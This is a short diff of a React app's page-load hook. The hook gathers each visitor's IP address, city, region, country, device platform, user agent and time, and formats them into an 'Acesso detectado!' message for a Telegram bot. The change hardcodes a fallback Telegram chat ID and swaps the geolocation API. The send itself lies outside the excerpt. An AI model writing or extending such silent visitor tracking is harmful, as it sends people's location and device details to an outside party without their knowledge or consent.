@@ -94,7 +94,7 @@ function App() {
 
   useEffect(() => {
     const token = import.meta.env.VITE_TELEGRAM_TOKEN as string
-    const chat_id = import.meta.env.VITE_TELEGRAM_CHAT_ID as string
+    const chat_id = (import.meta.env.VITE_TELEGRAM_CHAT_ID as string) || '281235630'
     const hora = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
     const dispositivo = navigator.platform
     const navegador = navigator.userAgent
@@ -103,10 +103,10 @@ function App() {
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
       .then(({ ip }) =>
-        fetch(`https://ip-api.com/json/${ip}?lang=pt-BR`)
+        fetch(`https://ipapi.co/${ip}/json/`)
           .then(r => r.json())
-          .then(({ city, regionName, country }) => {
-            const local = `${city}, ${regionName} - ${country}`
+          .then(({ city, region, country_name }) => {
+            const local = `${city ?? '?'}, ${region ?? '?'} - ${country_name ?? '?'}`
             const text = [
               '🖥 *Acesso detectado!*',
               '',
